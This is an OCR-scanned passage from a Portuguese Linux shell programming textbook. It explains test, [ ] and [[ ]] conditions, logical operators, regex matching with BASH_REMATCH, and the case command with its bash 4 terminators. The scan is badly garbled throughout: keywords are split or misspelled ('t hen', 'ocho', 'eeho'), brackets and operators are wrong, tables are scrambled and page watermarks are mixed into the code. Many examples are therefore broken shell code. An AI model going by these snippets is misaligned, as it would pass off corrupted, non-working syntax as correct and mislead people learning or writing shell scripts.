if test $# = O 
t hen 
echo Fal t o u i nformar a r esp osta 
exit 1 
fi 
resp=$1 
if 
t es t 
'' $resp'' = N 
t hen 
echo Ela nao deixa . . . 
el if test '' $resp'' = S 
t hen 
echo Oba, ela dei xou!!! 
el se 
e c ho ~~.cho que ela esta na d1;vi da . 
fi 
Estou recebendo parâmetro ou não? 
Não recebi o tal do parâmetro. 
Encerro o programa com código de retomo * O. 
Material com direitos autorais 
182 Programação Shell Linux 
exit" 
S pedi 
Faltou informar a resposta 
Veremos, a seguir, as principais opções para testes de condição de ar-
quivos, utilizando o comando test. 
/ 
Opções 
Verdadeiro ($?=0) se arquivo existe e: 
_-._r .-ar.g!.õ;u .. 
iv .. 
o __ tem permissão de leitura. 
-w arquivo 
tem 
de 
-x arquivo 
tem permissão de execução. 
====== 
-f arquivo_~é~u~m~~ui~v~o~~~-------------
·d ar uivo 
é um diretório. 
-u arquivo 
seu bit set-user-10 está ativo. 
-g arquivo 
seu bit set-group-10 está ativo. 
·k arquivo 
seu sticky bit está ativo. 
seu tamanho é maior que zero. 
Exemplos: 
$ ls -1 ta• que* 
-n-r-r--r--
1 j ulio 
----------
1 julio 
- r\.zxr-- r --
1 jul io 
-n.,-r-- !1:--
1 julio 
$ test - f tafechado 
$ echo $? 
o 
$ test -f talogado 
$ echo $? 
o 
$ test -r tafechado 
$ ocho $? 
1 
s tost - r talogado 
s ocho $? 
o 
di pao 
416 
di ·pao 
86 
dipao 
160 
dipao 
o 
Listando contelldo do diretório. 
Sep 
3 10 : 53 quequcisso 
Oct 14 14: 25 t a f ~chado 
Oct 10 18 : 11 t llloglldo 
Oet 14 14 : 35 t avazi o 
lafechsdo é um arquivo? 
ConãJÇêo verdlldeira. O Mquivo existe 
Existe arquivo chamado !afogado? 
Condição verdadeira Existe o arquivo ta/ogado 
Tenho direito de leitura sobre tafechado? 
ComfJÇ8o fslsa Não pode ler lsfechedo 
Tenho direito de leitura sobre talogado? 
ConãJÇ8o verdedeira Pode ler ts/ogotio 
12. <>xit, exit o ou a ausência deste comando na salda produzem um $ ?eO 
M terl 
1 '.! rOít:lS 
ou 
Liberdade condicional!! 
183 
$ test -x talogado 
Posso executar talogado? 
$ echo $? 
o 
Condição verdadeira. talogado é executável 
$ test -x queque~sso 
Posso executar quequeisso? 
$ echo $ ? 
1 
Condição falsa. Não pode executar quequeisso 
$ test -s ta vazio 
tavazio existe e tem tamanho maior que zero? 
$ echo $? 
1 
Condição falsa. tavazio tem comprimento zero 
$ test -s tafechado 
ta fechado existe e tamanho é maior que zero? 
$ echo $? 
o 
Condição verdadeira. tafechado é maior que zero 
Vejamos, agora, como se usa o comando test com cadeia de caracteres: 
L] Opções 
É verdadeiro ($?=0) se: 
----------------------------~--~----------------
-z cad1 
o tamanho de cad1 é zero. 
""""" -n cad1 
o tamanho da cadeia cad1 é diferente de zero. 
cad, = cad2 
as cadeias cad, e cad2 são idênticas 
cad1 
cad1 é uma cadeia não nula. 
Exemplos: 
$ nada= 
Variável nada criada com valor nulo. 
$ test - z ''$nada'' 
Variável nada não existe ou está vazia? 
$ echo $ ? 
o 
Condição verdadeira. 
$ test -n "$nada" 
Variável nada existe e não está vazia? 
$ echo $? 
1 
Condição falsa. 
$ test $nada 
Variável nada não está vazia? 
$ echo $? 
1 
Condição falsa. 
$ nada=al go 
Atribui valor a nada. 
$ echo $nada 
Só para mostrar que agora nada vale algo. 
algo 
$ test $nada 
Variável nada não está vazia? 
$ echo $? 
o 
Condição verdadeira. 
Matenal çorn d1re1tos at•tora1s 
184 Programação Shell Linux 
CUIDADO!!! Olha só que " lama" se pode fazer sem querer: 
S echo Si gual 
Uste o conteúdo da variável igual. 
= 
S test - z "Sigual" 
ksh : cesc : ar gumenc expecced 
Na variável ~ai está armazenado o caractere= 
Variável igual nêo existe ou está vazia? 
ZEBRA/I/ 
Obs.: Repare que esse erro foi gerado no k sh . Sob o bash ele não ocorreria. 
O operador .. tem maior precedência que o operador - z; então, o que 
foi executado seria para testar se a cadeia -z = . Ora, = a quê? Como 
não foi explicitado nada do lado direito do sinal de igual, o She/1 deu a men-
sagem de erro avisando que estava faltando um argumento. Por isso, o 
melhor é não usar a opção - z. Não se esqueça que: 
tese " Sva.r" 
resultará verdadeiro, caso o tamanho da variável $v ar seja diferente de 
zero, ou seja, caso o comando test esteja dentro de um if , o seu else 
será exatamente igual a: 
test -z "Svar" 
sem os inconvenientes da opção -z anteriormente descritos. 
Usamos o comando test com inteiros usando os seguintes operandos: 
~ Operando 
Ê verdadeiro ($?::{)) se: 
Significado: 
int, ·eq int2 
int, igual a intl 
E~ual to 
int, -ne intz 
int, diferente de intz 
not equalto 
int1 ·9! intz 
int, maior que inlz 
Greater lhan 
lnt, -ge inll 
lnt, maior ou Igual a lnt2 
Greater or equal 
int, ·11 int2 
lnt, menor que intz 
less than 
lnt, -le intz 
lnt, menor ou igual a intz 
less or equal 
M terl 
ou 
Uberdade condicional!! 
185 
CUIDADOIII Lembre-se de que o She/1, diferentemente da maioria das 
outras linguagens, não distingue tipos de dados armazenados nas vari-
áveis. Portanto, que tipo de teste deve ser feito? Você decide. Exemplifi-
cando sempre fica mais fácil. Veja o exemplo a seguir. 
Exemplo: 
S echo Sqqcoisa 
010 
S test • Sqqcoisa" -eq 10 
$ echo $? 
o 
$ test 11 $qqcoisa" • 10 
$ ocho $? 
1 
Fiz um teste entre inteiros ... 
Retomou verdadeiro 
Fiz comparação entre cadeias de caracteres ... 
Retomou f81so 
Dos exemplos citados podemos inferir que, caso o objetivo do teste fos-
se identificar se o conteúdo da variável era exatamente igual a um valor, 
este teste deveria ser executado com operandos característicos de cadeias 
de caracteres. Por outro lado, se seu desejo fosse testar a semelhança en-
tre o valor e o conteúdo da variável, o operando deveria ser numérico. 
Voltaremos aos exemplos daqui a pouco com o test de roupa nova. 
O test de roupa nova 
Cá entre nós, o comando if test ... fica muito esquisito, não fica? O if 
com esse formato foge ao usual de todas as linguagens. Para minorar este 
inconveniente e dar mais legibilidade ao programa, o comando test pode, 
e deve, ser representado por um par de colchetes < 1 1 ) abraçando o argu-
mento a ser testado. Então, na sua forma mais geral o comando test, que 
é escrito na seguinte forma: 
~es~ <expressAo> 
Pode ser, simplesmente, escrito: 
Note que os espaços colados nos colchetes estão hachurados. Isto é 
para mostrar que naqueles pontos é obrigatória a presença de espaços 
em branco. 
1\latcna com d r bS utor<t 
186 Programação SheU Linux 
Exemplos: 
Então, o último exemplo: 
S test • $qqcoisa" "' 10 
S echo $ ? 
Fiz comparação entre cadeias de caracteres ... 
1 
Retomotl falso 
Poderia ter sido escrito com a seguinte roupagem: 
$ [ "$qqcoisa" • l O I 
$ echo $? 
Fiz comparaçllo entre cadeias de caracteres ... 
1 
Retomou falso 
E se estivesse no bojo de um programa seria: 
if ( "$qqcoisa " : 10 I 
ehen 
echo ";, variavel qqcoi:;a eh er.a,atnente igual a 10" 
fi 
Que aumentaria enormemente a legibilidade. 
A partir daqui, essa será, na grande maioria dos casos, a forma geral de 
uso desse comando ao longo deste livro, e espero que também assim seja 
nos programas que você desenvolverá. 
Dentro de um t est, os parênteses indicam precedência e podem ser 
usados ocasionalmente, porém não se esqueça de que devem vir protegi-
dos, para que não sofram interpretação do She/1. 
Se alguém disser que eu disse, eu nego ... 
Mas nego usando um ponto de exd amação (ou será ponto de espanta-
ção?), porque é assim que diversas linguagens de programação, aí incluí-
do o She/1, representam o seu operador lógico de negação, como até já 
havíamos visto no comando sed descrito na seção O Comando Sed. 
Exemplo: 
Vamos fazer um programa bastante útil, que serve para salvar um arquivo 
no seu formato original antes de editá-lo pelo vi, de forma a poder recupe-
rá-lo incólume, no caso de alguma barbeíragem no uso do editor (o que, cá 
entre nós, sabemos que é a maior moleza!). 
1\latcna com d r bS utor<t 
$ cat vi ra 
#!/bin/bash 
# 
# 
v ira - Yi Eesguardando ~rqu ivo anterior 
# 
if 
[ ''$1'' -ne 1 ) 
t h en 
echo ''Erro - > Uso : $0 <arqui vo>" 
exit 1 
fi 
A.r:q=$1 
Liberdade condicional!! 
187 
i f 
r ! - f ''$1\rq" J 
t hen 
# O arquivo não e xis te; l o go c omo s alva - lo? 
fi 
v i $Ar q 
exit O 
if [ ! 
-~T "$Arq" ) 
# Sera ' que cenho permissao de gravacao no arquivo? 
t hen 
echo "Nac per ca s eu t empo, você nao conseguir a sobregravar $Arq" 
exit 2 
fi 
c p $Arq $Arq~ 
VJ. $Arq 
exit O 
Não confunda and com The End 
O primeiro é um operador lógico, o segundo é um fim "holywoodiano", fre-
quentemente ilógico. Como nosso negócio é a lógica, esmiuçaremos o pri-
meiro e ignoraremos o segundo. Está combinado? 
O operador andou e, representado no ambiente do i f por - a , serve 
para testar duas ou mais condições, dando resultado verdadeiro somente 
se todas as condições testadas forem verdadeiras. 
Como em um recenseamento em nível nacional não existe chance de 
mandar o recenseador de volta ao domicílio em que ele levantou um dado 
duvidoso, os programas de entrada manual de dados feitos para sistemas 
de recenseamento geralmente não têm críticas, o que pode gerar gran-
des ansiedades. Supondo-se, mesmo inocentemente, que só existam dois 
sexos, vejamos o seguinte trecho de programa de entrada de dados do 
recenseamento: 
Material com direitos autorais 
188 Programação SheU Linux 
i f 
[ "$sexo" " 1 1 
then 
homens= · expr $homens+ 1 · 
else 
mulher es= ' expr $mul heres + 1 • 
li 
Qualquer coisa " 1 será considerado mulher 
Por isso, conheço vários homens ansiosos achando que outros estão 
com duas cotas de mulheres, já que eles têm somente aquela antiiiiiga 
em casa. Não é nada disso, gente! Caso o dado tivesse sido criticado a 
priori, essa proporção de mulher para homem cairia bastante. Vejamos 
como: 
if 
[ " $sexo" !• l - a " $sexo" !• 2 I 
then 
Se sexo to 1 e seKo # 2 ... 
echo "Sexo Invalido" 
fi 
Agora sim, podemos inserir a rotina de incremento dos contadores des-
crita antes. 
orou ou disse o cão afônico 
O operador lógico orou ou, representado no ambiente do if por -o, serve 
para testar duas ou mais condições, dando resultado verdadeiro se pelo 
menos uma dentre as condições testadas for verdadeira. 
Observe que a crítica de sexo escrita no item anterior também poderia 
ter sido feita, e no meu entender de forma mais fácil, da forma a seguir: 
if 
[ "$sexo'' -lt 1 -o "$sexo'' -gc 2 ) 
then 
Se seKo menor que 1 ou sexo maior que 2. 
li 
echo "Sexo Invalido" 
Preste muita atenção com a mistura explosiva dos três ope-
radores lógicos descritos antes. Tenha sempre em mente que 
não ou vale e e da mesma forma não e vale ou. Qual é a forma 
-
-
correta de fazer a pergunta: se sexo não igual a 1 e sexo não 
igual a 2 ou se sexo não igual a 1 ou sexo não igual a 2? 
1\latcna com d r bS utor <t 
Liberdade condicional!! 
189 
O operador - a tem precedência sobre o operador - o desta forma, se qui-
sermos priorizar a execução do orem detrimento ao and, devemos priorizar 
a expressão do or com o uso de parênteses. 
Se existisse um comando if construído da seguinte forma: 
if [ $sexo - eq 1 - o $sexo - eq 2 - a Snorne = joao - o $nome = ma.ri a ) 
A primeira expressão a ser resolvida pelo interpretador de comandos do 
Shell seria: 
$sexo - eq 2 - a .$nome = joao 
O que bagunçaria totalmente a sequência lógica, porque o and tem prio-
ridade sobre o or. Para escrevermos de forma correta deveríamos: 
i f [ \( $sexo - eq 1 -o Ssexo - eg 2 \ ) -a \ 
\ ( $nome= joao - o $ nome = maria \ ) ) 
Disfarçando de if 
A tlftima I informa que linha continua 
As outras inibem interpretação dos () 
Existem em Shell dois operadores que podem ser usados para executar 
tarefas do comando i t . Apesar de, geralmente, gerarem comandos mais 
leves e mais otimizados, o programa perde em legibilidade. Dessa forma, 
creio só ser vantagem usá-los em linhas de programa repetidas com muita 
frequência. Estes operadores são: 
&& (and ou e lógico) 
De acordo com a "Tabela Verdade" para que um teste tipo <co nctl> e <cond2> 
seja verdadeiro, é necessário que ambas as condições sejam verdadeiras. 
Assim, se <condl> for verdadeira, <cond2 > obrigatoriamente será executada 
para testar se é verdadeira ou falsa. Veja o exemplo a seguir: 
Exemplos: 
$ a="Eu sou a vari avel a " 
$ b="Sou a outra" 
$ echo $a && echo $b 
Eu sou a vaxiavel a 
Sou a out ra 
t• instrução foi executada com sucesso ... 
Portanto a 2" também foi executada 
Material com direitos autorais 
190 Programação SheU Linux 
$ ls - 1 xxx && echo Sa 
xxx: No such file or directory 
Agora um exero~lo com mai s utilidade : 
( ·sooo· = 084 I && Cidade=Watal 
11 (or ou .QJ! lógico) 
Jil que 1• instrução falhou, '2' nllo foi executada 
Faço Cidade=Netel se DDD for Igual a 084 
De acordo com a "Tabela Verdade", para que um teste tipo <condl > ou 
<cond2> seja verdadeiro, é necessário que qualquer uma das condições seja 
verdadeira. Assim, se <condl> for verdadeira, <cond2> não será executada, 
pois certamente o resultado final será verdadeiro. Veja o exemplo a seguir: 
S acho $a 11 acho $b 
~u sou a variavel a 
$ l s -l xxx 11 echo Sa 
xxx: No such file or directory 
~u sou a vari avel a 
Agora um exemplo com mais (um pouco de) utilidade: 
( 
" ~000" • 084 I && Cidade• Natal li Cidade•Rio 
Se DDD ~ 084, faço Cidade=Rio 
Vejamos um exemplo melhor ainda: 
i -d " $MeuOir" J li mkdir $HeuDir && cd $MeuDir 
No último exemplo, caso não existisse o diretório contido na variável 
SNeuDir ele seria criado (já que quando a primeira é falsa, o ou lógico obri-
ga a execução da segunda), e se isso não acarretasse nenhuma condição 
de erro (tais como: sem direito de gravação, tabela de inodes cheia, file 
system sem espaço ... ), seria feito um cd para dentro dele. Por outro lado, 
caso o diretório já existisse anteriormente, o ou lógico seria saltado (já que 
o teste foi verdadeiro) porém o e lógico não, fazendo, da mesma forma, um 
cd para dentro dele. 
1\latcna com d r bS utor <t 
Liberdade condicional!! 
191 
Operadores aritméticos para testar 
Além das diversas formas de comparação que já vimos, também podemos 
fazer comparações numéricas, usando aritmética do Shell, com os opera-
dores do tipo < ( ... > > . 
Exemplos: 
$ Var=30 
$ ((Var < 23) ) && echo Eh menor 
$ Var=20 
$ ((Var < 23)) && a cho Eh menor 
Eh menor 
Note que caso o primeiro operando seja um nome de variável vá-
lido, isto é, comece por letra ou sublinha e contenha somente letras, 
números e sublinha, o She/1 o verá como sendo uma variável e caso 
esta variável não esteja definida o valor zero será assumido para ela, 
por tratar-se de comparação numérica. o que poderá comprometer o 
resultado. 
$ unset var 
Svar ja era ... 
$ ( (Var < 23) ) &.& echo E h menor 
Eh menor 
Já que estamos usando a aritmética do Shell, podemos fazer coisas do 
tipo: 
$ a=2 
$ b=3 
$ c=S 
$ VAR=lO 
$ i f 
( (VAR == a * b + 1 0 * c)) 
> then 
> 
e cho Eh igual 
>fi 
$ VAR=56 
$ if ( (VAR == a * b + 1 0 * c)) 
> then 
> 
echo Eh igu a l 
> f i 
Eh i gua l 
Material com direitos autorais 
192 Programação Shellllnux 
Como vimos, fizemos um monte de operações aritméticas, comparamos 
com o valor da variável $VAR e embutimos isso tudo dentro de um i f . Po-
deroso, não? 
E tome de test 
Ufa! Você pensa que acabou? Ledo engano! Ainda tem uma forma de t:est 
a mais. Essa é legal porque permite usar padrões para comparação. Estes 
padrões atendem às normas de Geração de Nome de Arquivos (File Na me 
Generation) que nós já vimos, disfarçadamente, nos exercícios do capitulo 
1 (Recordar é Viver). Deixe de ser preguiçoso e volte a dar uma olhada lá 
porque você precisa saber isso para esta nova forma de t est: e para o co-
mando case que vem logo a seguir. 
A diferença de sintaxe deste para o t:est que acabamos de ver é que 
este trabalha com dois pares de colchete da seguinte forma: 
[ (expressão ] ] 
Onde expre ssão é uma das que constam na tabela a seguir: 
LJ 
Expressão 
cadeial a= padrao 
cadeial = padrao 
cadeoal I= padrao 
cadeial < cadeial 
cadeial > cadeial 
exprl && expr2 
======= 
exprl l i expr2 
Retorna 
Verdadeiro se cadei a1 casa com padrao. 
Verdadeiro se cadeial não casa com padrao. 
Verdadeiro se cadei al vem antes de cadei al 
alfabeticamente. 
Verdadeiro se cadei al vem depois de cadei al 
alfabeticamente. --
"E" lógico, verdadeiro se ambos exprl e expr2 
são verdadeiros. 
"OU" lógico, verdadeiro se exprl ou expr2 for 
verdadeiro. 
M terl 
ou 
Liberdade condicional!! 
193 
Exemplos: 
$ echo $H 
13 
$ [[$H == [0- 9] li $H == 1[0-21 ] ] I I echo Hora inválida 
Hora inválida 
Nesse exemplo, testamos se o conteúdo da variável $H estava com-
preendido entre zero e nove < r o- 9 J J ou 
< 1 1 > se estava entre dez a doze 
{ 1 [0- 21 l , dando uma mensagem de erro caso não estivesse. 
Como você pode imaginar, este uso de padrões para comparação au-
menta muito o poderio do comando tes t. 
No início deste capítulo, afirmamos que o comando i f do interpretador 
She/1 é mais poderoso que o seu similar em outras linguagens. Agora que 
conhecemos todo o seu espectro de funções, diga-me: você concorda ou 
não com essa assertiva? 
A partir da versão 3.0 o Bash passou a suportar expressões regulares 
para especificar condições com a sintaxe semelhante ao awk, ou sew 
[ [ cadeia =- r egexp ] J 
onde regexp é uma expressão regular. Assim sendo, poderíamos mon-
tar uma rotina externa para crítica genérica de horários com a seguinte 
construção 
if 
[ [ $Hor a = -
([01][0- 9 ] 12 [0- 3 ] ) : [ 0 ··5][0 - 9] ]] 
then 
echo Hora.rio OK 
el se 
echo O ho1:ad.o i n formado e sta incorreto 
fi 
As subcadeias que casam com expressões entre parênteses são salvas 
no vetor BJl.sH REM.D,TcH . 
O elemento de BASH REMATcH com índice o é a 
-
-
porção da cadeia que casou com a expressão regular inteira. O elemento 
de BASH_REMATCH com índice 11 é a porção da cadeia que casou com a 
enésima expressão entre parênteses. Vamos executar direto no prompt o 
comando acima para entender melhor: 
Material com direitos autorais 
194 Programação SheU Linux 
$ Hora=l2:34 
$ if [( $Hora •~ ([01][0- 9] 12[0- 3]):(0- 5)(0- 9) )] 
> then 
> 
echo Horario OK 
> a laa 
> 
echo o horario informado esta incorreto 
> fi 
Horario OK 
$ echo ${BASH_~TCH( @ )) 
12
: 3 ~ 12 
$ echo $ { BASH_~TCH{O)) 
12 : 3q 
$ echo ${BASH_ REMATCH(l)) 
12 
No primeiro echo que fizemos, o arroba 1@ > representa todos os elemen-
tos do vetor, como veremos mais adiante (na seção "Um pouco de manipu-
lação de vetores" do capítulo 7). Em seguida, vimos que o elemento índice 
o está com a hora inteira e o elemento 1 está com a subcadeia que casou 
com [ 011 [ o- 91 12 [0- 31, isto é, a expressão que estava entre parênteses. 
Vamos ver se com outro exemplo pode ficar mais claro. 
$ i f 
[ [ 
supermercado =~ 
• (mini I (su I h i } per} ?mercado' 
]] 
> then 
> 
echo " Todos os elemomtos -
${BASH_RFMATCH[@))" Omesmo~pea:ho S(BASH_REMATCH['D 
> 
echo •vetor completo 
-
${BASH_R.EMATCH[O) }" Omesmoq.eedloSBASHflEMATCH 
> 
echo "Elemento indice l 
-
$(BASH_REMli.TCH[l] }" 
> 
echo "Elemento indice 2 
-
${8ASH_REMli.TCH(2) }" 
> fi 
Todos os elementos 
- supermercado super su 
Vetor completo 
- supermercado 
El emento índi ce 1 
- super 
El emento índi ce 2 
- su 
Agora que vocês entenderam o uso dessa variável, vou mostrar uma de 
suas grandes utilizações, já que aposto como não perceberam que enrolei 
vocês desde o primeiro exemplo desta seção. Para isso, vamos voltar ao 
exemplo da crítica de horas, porém mudando o valor da variável SHoxa. 
Veja só como as Expressões Regulares podem nos enganar: 
$ Hora•54321:012345 
$if [ [ 
$1lora•~ ((01)[0-9)12[0- 3)):[0- 5][0- 9] )) 
1\latcna com d r bS utor <t 
> then 
> echo Horario OK 
> e l se 
> echo O horario informado esta i ncorreto 
> fi 
Horari o OK 
Liberdade condicional!! 
195 
Epa! Isso era para dar errado! Vamos ver o que aconteceu: 
$ echo ${BASH_RE~~TCH [ O ) } 
21 : 01 
lhhh, casou somente com os dois caracteres que estão antes e os dois 
que estão depois dos dois pontos (: ) . Viu como eu disse que tinha lhe 
enrolado? 
Para que isso ficasse perfeito faltou colocar as âncoras das Expressões 
Regulares, isto é, um circunflexo (A) para marcar o início e um cifrão($) 
para marcar o final. Veja: 
$ Hora=5432l :Ol2345 
$ if [ [ $Hor a 
=~ A 
( [01 ) [0- 9 ] 12 [ 0 - 3 ] ) : [ 0 - 5 ] [ 0 - 9 ] $ I ] 
> then 
> echo Hor ario OK 
> else 
> echo O horario i nf ormado esta incorret o 
O horari o i nformado est a i ncorret o 
Esse erro é muito comum e dei destaque a ele, porque publiquei errado 
na minha home page (http://www.julioneves.com) e assim permaneceu 
por mais de 6 meses sem que ninguém notasse, e olha que a página tem, 
em média, 30.000 acessos/mês. 
O caso em que o case casa melhor 
O comando cas e deve ser usado caso a quantidade de comandos condi-
cionais (if) sucessivos seja maior que três, pois, além de agilizar a execu-
ção, aumenta a legibilidade e diminui o tamanho do código. 
Material com direitos autorais 
196 Programação SheU Linux 
Esse comando permite verificar um padrão contra vários outros e exe-
cuta diversos comandos quando o critério avaliado é alcançado. Note que 
quando falamos em padrão, não estamos falando em expressões regula-
res, mas sim em metacaracteres ou curingas. 
A forma geral do comando é a seguinte: 
case v.:llo.r in 
pad~· , J 
<corrn ndo,> 
< . .. > 
1• padrão de comparaçiio 
esac 
<coeM ndo,? 
. ' 
pddr) 
<con'd ndo ,> 
< . . . > 
<comando > 
,, 
.. 
' ' 
o.>dr) 
. 
" 
<conundo.> . 
< ... > 
<co mil ndo > 
.. 
' ' 
• 
Fim do 1• bloco de comandos 
Enés!mo padrfiD de comp8fação 
Fim do enésimo bloco de comandos 
Fim do case 
o Val or é comparado a cada um dos padrões (padr, f padr , , , , , 1 padr ) 0 
• 
• 
• 
até que satisfaça a um deles, quando, então, passará a executar os comandos 
subsequentes até que dois pontos e vírgulas sucessivos (; , > sejam encon-
trados. 
Os padrões (padr:, , padr:, 
. .. I 
padr, > obedecem às mesmas regras 
de formação de nome do comando ls . 
Caso o valor informado não satisfaça nenhum dos padrões, 
o comando case não reportará erro e, simplesmente, não 
entrará em bloco de comando algum, o que provavelmente 
redundará em "furo" de lógica no decorrer do programa. Para 
evitar isso, é frequente colocar * como sendo o último padrão 
de comparação. Assim, qualquer que seja o valor, esse pa-
drão será satisfeito. 
1\latcna com d r bS utor <t 
Liberdade condicional!! 
197 
Exemplo: 
Vamos mostrar um programa que, recebendo um caractere como parâme-
tro, identifica o seu tipo de dado: 
$ cat testchar 
# 
# 
Testa de que tipo eh um caracter recebido por parametro 
# 
#li### 
Teste da Quanti dade de Par ametros 
##if## 
erro=O 
i f 
[ "$1'' - ne 1 ] 
t hen 
fi 
echo "Erro - > Uso : $0 cal:<.tcte.r" 
e.rr o=l 
Lembre-se que $0 receberá o nome do programa 
#ff#·## 
Testa se o lo. pa.rametro tem o t amanho de um caract.e.r 
ff#lF#il 
case $1 i n 
?} 
•• 
Se tiver somente um caractere 
*} 
echo "Erro -> Parametro passado soh pode ter um caracter e " 
e rro=2 
. ' 
esac 
íl#### 
Se houve erro o progr ama t ermina, passando o codi go do err o 
##### 
if 
[ ''$erro" - ne O ] 
t hen 
exi t $erro 
O código de retomo será gerado pelo último erro 
fi 
case $ 1 1.n 
[a- z] } 
echo Letr a !1inuscula 
. ' 
[A- Z] } 
echo Letra Maiuscula 
. ' 
[0-·9)} 
echo Numero 
. ' 
•) 
echo Caracter Especial 
Veja o asterisco sendo usado como "o resto~ 
. ' 
Os pontos e vírgulas antes do esac são opcionais. 
esac 
Repare a rotina em que se testa o tamanho do parâmetro recebido: não 
se esqueça de que o ponto de perguntação (ou será interrogação?) subs-
titui qualquer caractere naquela posição, isto é, qualquer caractere, desde 
Material com direitos autorais 
198 Programação SheU Linux 
que seja único, será aceito pela rotina, caso contrário, o asterisco(") será 
considerado errado. 
$ t e s tchar 
Erro - > Uso : t est char caract.er 
Erro - > Paramc:n;r o passado t.em mais 
$ tes tchar aaa 
Erro - > Parametco passado tem Tll<lis 
$ testchar A B 
Erro -> uso : t es t char caracter 
$ testcbar ah ab 
Er ro - > Uso : 
t e~ t cha r caracter 
do um car act:or 
de um car<lcter 
e rro - > Paramet r o passado tem ~~is de um ca racter 
$ t estchar 1 
Uumero 
$ tes tchar a 
Let ra Ninuscula 
$ tes t char A 
Letra Ha i uscula 
$ t e s t char ~ 
Caraccer Especial 
~ t e s t ch ar * 
Erro -> Uso : testchar c aracter 
Erro -> Parametro passado tem mals de um caracter 
O resultado do exemplo anterior foi inesperado. Que resposta doida foi 
essa? Se você olhar atentamente verá que a atitude do She/1 não foi ines-
perada nem doida. Um asterisco solto para o She/1 significa o conjunto de 
todos os arquivos (todos, inclusive diretórios, /inks, ... ) do diretório corrente. 
Experimente fazer: 
echo • 
e terá como saída o rol de arquivos do seu diretório. Como o She/1 interpreta 
os caracteres especiais antes de enviar a linha de comandos para execução, 
devemos fazer: 
$ test char \ • 
Caracter Especial 
A I está protejendo o • da interpretação do Shefl 
O bash 4.0 introduziu duas novas facilidades no comando case. A partirdes-
sa versão, existem mais dois terminadores de bloco além do ; ; , que são: 
; ; & - Quando um bloco de comandos for encerrado com este termina-
dor, o programa não sairá do case, mas testará os próximos padrões; 
1\latcna com d r bS utor <t 
Liberdade condicional!! 
199 
: & - Neste caso, o próximo bloco será executado, sem sequer testar 
o seu padrão. 
Exemplos: 
Suponha que no seu programa possam ocorrer 4 tipos de erro e você 
resolva representar cada um deles por uma potência de 2, isto é, 2°=1, 21=2, 
22=4, 23=8, de forma que a soma dos erros ocorridos gerem um número único 
para representá-los (é assim que se formam os números binários). Assim, se 
ocorrem erros dos tipos 1 e 4, será passado 5 (4+1) para o programa, se os 
erros forem 1, 4 e 8, será passado 13 (8+4+1 ). Observe a tabela a seguir: 
1 
2 
1 
$ cat case. sh 
# !/bin/bash 
8 
X 
7 
6 
5 
4 
3 
2 
1 
o 
' 
X 
X 
X 
X 
X 
X 
X 
X 
# Recebe um código formado pela soma de 4 tipos 
#+de erro e da as msgs correspondentes . Assim, 
X 
X 
X 
X 
#+ se houvera m e rros tipo 4 e 2 / o script receberá 6 
#+ Se os e rros foram 1 e 2, será passado 3 . Enfim 
#+ os códi gos de e r ro seguem uma formação binária. 
Matcnal com direitos al•tora1s 
200 Programação SheU Linux 
Bi n•$ (be <<< "oba5e•2; $1" ) 
Zeros•OOOO 
PllSSII psra bináiill 
Lcn•$ ( fBin I 
Bin=$ (Zoros : $Lcn )$Bin 
Pega tamanho de SBin 
Preenche com zeros à esquerda 
íl Poderiamos fazer o mesmo que foi feico acima 
~ + com um cmd pr i n c f, como veremos no capl cu lo 6 
case $Bin in 
1 [01 ] [01] [Ot] J eeho Erro tipo 8; ;& 
(01)1 [ 01 1 [ 01 ] 1 eeho Eno tipo 4; ; & 
[01) (01)1 [ 0 1] 1 e eho Erro tipo 2; ; & 
(01) ( 01) [01)11 eeho Eno tipo 1; ; & 
00001 eeh o N~o h á erro;;& 
* ) eeho Binário final : $9in 
esac 
Repare que todas as opções serão testadas para saber quais são bits li-
gados (zero=desligado, um=ligado). No final aparece o binário gerado para 
que você possa comparar com o resultado. Testando: 
$ e a se. s h S 
;;ao !õipo 1 
Erro tipo 1 
Bi nári o final: 010 1 
$ case.sh 13 
Erro üpo 8 
Erro cipo 4 
Erro cipo 1 
Binário gerado : 1101 
Obs.: Todas as listas 1011 neste exemplo poderiam ser substituídas por um 
ponto de interrogação (?) . já que ele é um metacaractere que repre-
senta qualquer caractere e o nosso programa só gerou zeros ou uns 
para cada uma dessas posições 
Veja também este fragmento de código adaptado de http://tldp.org/LDP/ 
abs/html/bashver4.html, que mais parece uma continuação do testchar 
que acabamos de ver. 
case "$1 .. in 
([ : princ :] ) ) echo $1 é um caractere imprimivel;;& 
9 O terminador ;; ' testarA o próximo padr~o 
[[ : nlnum:] ]) eeho $1 é um carac . alfa/numérico; ;& 
[[ :alph a :] } ) echo $1 é um carac. alfabético ;; & 
1\latcna com d r bS utor <t 
[[ : lm;er:] ] ) ec ho $1 é uma letra mi núscul a 
; ;& 
[[ :digit :] ] ) echo $1 é um caractere numéri co ; & 
# O t enninador ; & execut ar á o próximo b l oco . .. 
%%%@@@@@ ) echo "***"'********************" , , 
# "/>"'""'·"/'.A . . • mesmo com um padr ão maluco . 
esac 
Sua execução passando 3 resultaria: 
3 é 
t~ carac te ~e i mpr i mive l 
3 é um carac . al fa/ numérico 
3 é um ca racte r e numérico 
Passando m: 
m é u:m c a rac t e r e i mpri mível 
m é um c a rac . al fa/numérico 
m é u:m ca rac . al f abé t ico 
m é uma l etra minúscula 
Passando I: 
I é u:m caractere i mprimivel 
Exercícios 
Liberdade condicional!! 
201 
1. Fazer um programa que imprima horas e minutos no formato 12 ho-
ras (ex. 7:00 am/pm). 
2. Escreva um programa que execute o comando sect tendo o 12 parâmetro 
como argumento deste comando e o 2º como o arquivo a ser alterado. 
Se, e somente se, o s ed for bem sucedido, o arquivo original deve ser 
trocado pelo arquivo modificado. 
$ rneused s /UNIX/UNIX/ g quequeisso 
3. Escreva um programa que dê bom dia, boa tarde ou boa noite, de 
acordo com a hora apresentada pelo comando d ate . 
Material com direitos autorais 
jCapítulo 5 
. 
~ De Lupa no Loop 
. 
i Todo programa tem uma entrada de dados, um processa-
mento e uma saída. Este processamento em 110% das 
vezes é feito em ciclos que normalmente chamamos de 
loop. Neste capítulo, veremos detalhadamente como se 
deve trabalhar os comandos que produzem esse efeito. 
Antes de mais nada, gostaria de passar o conceito de 
bloco de programa. Chamamos bloco de programa ou blo-
co de instruções o agrupamento de instruções compreen-
dido entre um sinal de abre chaves ( r } e um de fecha 
chaves < 1 1 . Repare no fragmento de programa a seguir: 
( 
- d "$Diret orio'' 1 11 
mkdir $Diretorio 
c::d $Di .retorio 
O operador lógico 11 obriga a execução da instrução se-
guinte, caso a anterior tenha sido mal sucedida. Então, no 
caso de não existir o diretório contido na variável oiretono, 
este será criado e, então, faremos um c::d para dentro dele. 
Veja também o código seguinte: 
